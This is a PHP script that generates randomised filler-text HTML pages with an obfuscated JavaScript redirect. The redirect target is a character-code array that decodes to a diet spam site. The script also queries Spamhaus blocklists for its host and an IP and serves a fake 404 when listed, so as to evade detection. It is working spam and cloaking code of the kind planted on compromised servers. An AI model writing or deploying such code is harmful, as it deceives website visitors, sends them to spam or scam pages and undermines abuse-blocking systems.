<?php



function result($data)
{
$darset=array("!doctype ","");
$darset=$darset[rand(0,count($darset)-1)];
$result=implode("\r\n",array("%1".$darset. "html"."%3","%1"."head"."%3",head(),"%2"."head"."%3","%1"."body style=\"color:white\""."%3",body($data),"%2"."body"."%3","%2"."html"."%3"));
$result=preg_replace('/%1/',"<",$result);
$result=preg_replace('/%2/',"</",$result);
$result=preg_replace('/%3/',">",$result);
$sign=parag(1,1).(strlen($result)+31331);
$result=preg_replace('/%sign%/',$sign,$result);
return $result;
}
function body($data)
{
srand(seed());
$body=array();
for($i=0;$i<rand(3,10);$i++)
{
$text=parag(50,250);
srand(seed());
$tags=array("p","div","span","strong","b");
$tags=$tags[rand(0,count($tags)-1)];
array_push($body,"%1$tags%3",$text,"%2$tags%3");
}
array_push($body,js($data));return implode("\r\n",$body);
}
function head()
{
srand(seed());$title=parag(2,10);
$charset=array("ISO-8859-1","UTF-8");
$charset=$charset[rand(0,count($charset)-1)];
$headers=array("%1title%3%sign% $title%2title%3","%1meta http-equiv=\"Content-Type\" content=\"text/html; charset=$charset\"%3");
srand(seed());
$rnd_num=rand(0,1);
if($rnd_num)
{
$description=parag(4,10);
$keywords=array();
for($i=0;
$i<rand(1,10);$i++){array_push($keywords,parag(1,1));} $keywords=implode(", ",$keywords);
srand(seed());
$additional=array("%1meta name=\"description\" content=\"$description\"%3","%1meta name=\"keywords\" content=\"$keywords\"%3");
$additional=$additional[rand(0,count($additional)-1)];
array_push($headers,$additional);
}
shuffle($headers);
return implode("\r\n",$headers);
}
function js($data)
{
srand(seed());
$diff=rand(1,100);
$name=parag(1,1);
$code="%1script type=\"text/javascript\"%3\r\n";
$code.=$name."a=$diff; ".$name."b=[";
$list=array();
foreach($data as $byte){array_push($list,($byte+$diff));}
$code.=implode(',',$list);
$code.="]; ";
$code.=$name."c=\"\"; for(";
$code.=$name."d=0;".$name."d<".$name."b.length;".$name."d++) { ";
$code.=$name."c+=String.fromCharCode(".$name."b[".$name."d]-".$name."a); } ";
$dcharset=array("window","top","document");
$dcharset=$dcharset[rand(0,count($dcharset)-1)];
$code.=$dcharset.".location.href=".$name."c;";
$code.="\r\n%2script%3";
return $code;
}
function parag($min,$max)
{
srand(seed());
$parag="";
$words=array("spokesman","spokesmen","sponge","sponged","sponger","spongers","sponges","sponging","spongy","sponsor","sponsored","sponsoring","sponsors","sponsorship","spontaneity","spontaneous","spontaneously","spoof","spook","spooky","spool","spooled","spooler","spoolers","spooling","spools","spoon","spooned","spoonful","spooning","spoons","sporadic","spore","spores","sport","sported","sporting","sportingly","sportive","sports","sportsman","sportsmen","sportswear","sportswriter","sportswriting","sporty","sposato","spot","spotless","spotlessly","spotlight","spots","spotted","spotter","spotters","spotting","spotty","spouse","spouses","spout","spouted","spouting","spouts","sprague","sprain","sprang","sprawl","sprawled","sprawling","sprawls","spray","sprayed","sprayer","spraying","sprays","spread","spreader","spreaders","spreading","spreadings","spreads","spreadsheet","spree","sprees","sprig","sprightly","spring","springboard","springer","springers","springfield","springier","springiest","springiness","springing","springs","springtime","springy","sprinkle","sprinkled","sprinkler","sprinkles","sprinkling","sprint","unforeseen","unforgeable","unforgiving","unformatted","unfortunate","unfortunately","unfortunates","unfounded","unfriendliness","unfriendly","unfulfilled","ungrammatical","ungrateful","ungratefully","ungratefulness","ungrounded","unguarded","unguided","unhappier","unhappiest","unhappily","unhappiness","unhappy","unharmed","unhealthy","unheard","unheeded","unibus","unicorn","unicorns","unicycle","unidentified","unidirectional","unidirectionality","unidirectionally","unification","unifications","unified","unifier","unifiers","unifies","uniform","uniformed","uniformity","uniformly","uniforms","unify","unifying","unilluminating","unimaginable","unimpeded","unimplemented","unimportant","unindented","uninitialized","uninsulated","unintelligible","unintended","unintentional","unintentionally","uninteresting","uninterestingly","uninterpreted","uninterrupted","uninterruptedly","union","unionization","unionize","unionized","unionizer","unionizers","unionizes","unionizing","unions","uniplus","uniprocessor","unique","uniquely","uniqueness","uniroyal","unisoft","unison","unit","unitarian","unitarianize","unitarianizes","unitarians","unite","united","unites","unities","uniting","units","unity","univac","univalve","univalves","universal","universality","universally","universals","universe","universes","universities","university","unix","unjust","unjustifiable","unjustified","unjustly","unkind","unkindly","unkindness","unknowable","unknowing","unknowingly","unknown","unknowns","unlabelled","unlawful","unlawfully","unleash","unleashed","unleashes","unleashing","unless","unlike","unlikely","unlikeness","unlimited","unlink","unlinked","unlinking","unlinks","unload","unloaded","unloading","unloads","unlock","unlocked","unlocking","unlocks","unlucky","unmanageable","unmanageably","unmanned","unmarked","unmarried","unmask","unmasked","unmatched","unmentionable","unmerciful","unmercifully","unmistakable","unmistakably","unmodified","unmoved","unnamed","unnatural","unnaturally","unnaturalness","unnecessarily","unnecessary","unneeded","unnerve","unnerved","unnerves","unnerving","unnoticed","unobservable","unobserved","unobtainable","unoccupied","unofficial","unofficially","unopened","unordered","unpack","unpacked","unpacking","unpacks","unpaid","unparalleled","unparsed","unplanned","unpleasant","unpleasantly","unpleasantness","unplug","unpopular","unpopularity","unprecedented","unpredictable","unpredictably","unprescribed","unpreserved","unprimed","unprofitable","unprojected","unprotected","unprovability","unprovable","unproven","unpublished","unqualified","unqualifiedly","unquestionably","unquestioned","unquoted","unravel","unraveled","unraveling","unravels","unreachable","unreal","unrealistic","unrealistically","unreasonable","unreasonableness","unreasonably","unrecognizable","unrecognized","unregulated","unrelated","unreliability","unreliable","unreported","unrepresentable","unresolved","unresponsive","unrest","unrestrained","unrestricted","unrestrictedly","unrestrictive","unroll","unrolled","unrolling","unrolls","unruly","unsafe","unsafely","unsanitary","unsatisfactory","unsatisfiability","unsatisfiable","unsatisfied","unsatisfying","unscrupulous","unseeded","unseen","unselected","unselfish","unselfishly","unselfishness","unsent","unsettled","unsettling","unshaken","unshared","unsigned","unskilled","unslotted","unsolvable","unsolved","unsophisticated","unsound","unspeakable","unspecified","unstable","unsteadiness","unsteady","unstructured","unsuccessful","unsuccessfully","unsuitable","unsuited","unsupported","unsure","unsurprising","unsurprisingly","unsynchronized","untagged","untapped","untenable","unterminated","untested","unthinkable","unthinking","untidiness","untidy","untie","untied","unties","until","untimely","unto","untold","untouchable","untouchables","untouched","untoward","untrained","untranslated","untreated","untried","untrue","untruthful","untruthfulness","untying","unusable","unused","unusual","unusually","unvarying","unveil","unveiled","unveiling","unveils","unwanted","unwelcome","unwholesome","unwieldiness","unwieldy","unwilling","unwillingly","unwillingness","unwind","unwinder","unwinders","unwinding","unwinds","unwise","unwisely","unwiser","unwisest","unwitting","unwittingly","unworthiness","unworthy","unwound","unwrap","unwrapped","unwrapping","unwraps","unwritten","up","upbraid","upcoming","update","updated","updater","updates","updating","upgrade","upgraded","upgrades","upgrading","upheld","uphill","vapor","vaporing","vapors","variability","variable","variableness","variables","variably","varian","variance","variances","variant","variantly","variants","variation","variations","varied","varies","varieties","search","starsigntaurus","grasped","immobility","lithest","gaudiest","harlequin","kisses","touch","sip","separating","opposing","notion","proved","booze","coffee","charms","seas","thread","ariadne","scheme","chef","convinced","scared","steps","virgin","liberty","days","following","husband","govern","record","honest","continuing","imprisond","hot","sunshine","inheritance","twilights","dusky","hair","whatsoeer","sunbright","full","childish","liveth","despaird","believd","remains","wearily","length","flaw","unknowingly","missed","stirrups","disciplined","wicked","sickle","bending","stop","matter","learn","history","bleak","mild","concerns","ordinary","winter","wears","proof","roys","alert","planned","plotted","fierce","row","dauntless","challenge","ask","apply","beauty","dower","woe","lintwhites","chorus","fellowtraveller","cold","ice","worlds","flu","illnessthree","region","lucky","bastard","twill","soothe","sorrow","polity","sacrifice","christ","saviour","sticking","kerchiefplots","mold","name","river","bare","wanderers","thousands","dollars","effortless","money","fatherly","concern","pang","vexd","aver","multitude","sweetly","reposing","bands","armsout","trees","veil","withdrawn","hut","tour","confuse","debut","godheads","benignant","andmoney","needed","ride","barking","cat","plays","neatly","error","unprofitable","ophilia","dear","delighted","sake","replaced","athletic","prophy","guessing","tundra","peter","norway","boors","prison","clinicmy","seemliness","complete","sways","seen","tiviot","dale","familiar","provokes","lady","shares","wonder","merits","resolved","eer","champion","brotherhood","venerable","damn","fawns","extacy","buttercups","unheard","cull","faculty","storm","turbulence","happy","genial","barely","cool","diffuse","blessd","main","embarrassd","shy","next","sense","persons","advance","hamilton","beginning","shield","latest","impearling","lucie","born","figures","braes","humbly","bloodshed","miserable","train","courtesies","wilt","panting","violets","acted","tidings","woes","end","stars","hungry","surprised","tells","clamor","stopped","dries","used","severe","since","untowardness","poets","mere","mostly","rooted","chair","livd","lands","soothed","milder","airs","stranger","seemingly","civil","harmless","stand","straight","nervous","daisy","blessed","rising","collapse","reaping","herself","remember","amazing","palms","infants","laughing","puzzled","blinded","immediately","leaps","feeding","appletree","superstition","worth","taking","sympathy","heeds","trace","upstarting","affright","greetst","fowls","ref","hadn","opened","score","nobody","posterity","renownd","unexciting","vice","guests","listend","fill","reaper","bushes","mournfully","eggs","gaze","places","hurrythree","flourish","seeking","school","scannd","dewdrop","unto","lowly","pursue","pox","turns","necessity","beloved","possess","grotto","particular","exquisite","baby","chains","tie","befal","yellow","rouzd","vale","holiday","flutterd","perchd","thank","mechanic","whip","lash","striking","force","applying","muscles","shaped","wake","highlands","troubles","beyond","relief","untimely","joyousness","hideandseek","homefelt","pleasures","itself","common","breeds","liked","greeting","mountains","eagle","seventythree","nighttime","short","hither","straightway","behold","seehis","fork","begins","rattle","boat","graven","read","fathers","courtesy","runaway","beautifully","outstandingly","clever","prettiest","tumbler");
if($min==1)
{
return $words[array_rand($words)];
}
else
{
$words_idx=array_rand($words,rand($min,$max));
$first_upc=1;
$parag=array();
foreach($words_idx as $idx)
{
$word=$words[$idx];
$rnd_num=rand(0,1);
$sym="";
if($rnd_num)
{
$rnd_sym=array(","," -",":",".");
$rnd_num=rand(0,count($rnd_sym)-1);
$sym=$rnd_sym[$rnd_num];
$word.=$sym;
}
if($first_upc)
{
array_push($parag,ucfirst($word));
$first_upc=0;
}
else
{
array_push($parag,$word);
}
if($sym=="." || $sym==":") $first_upc=1;
}
array_push($parag,$words[array_rand($words)]);
}
return implode(" ",$parag).".";
}
function seed()
{
list($usec,$sec)=explode(' ',microtime());
return(float)$sec+((float)$usec*1000);
}
$dr=gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');
if(preg_match("/^127\.0\.1/",$dr))
{
header("HTTP/1.1 404 Not Found");
exit;
}
$dr=gethostbyname("41.8.87.103.zen.spamhaus.org");
if(preg_match("/^127\.0\.0/",$dr))
{
header("HTTP/1.1 404 Not Found");
exit;
}
echo(result(array(104,116,116,112,58,47,47,102,97,115,116,119,101,105,103,104,116,108,111,115,115,45,98,101,115,116,100,105,101,116,46,99,111,109,47,63,97,61,49,107,103,67,38,99,61,100,105,101,116)));
?>
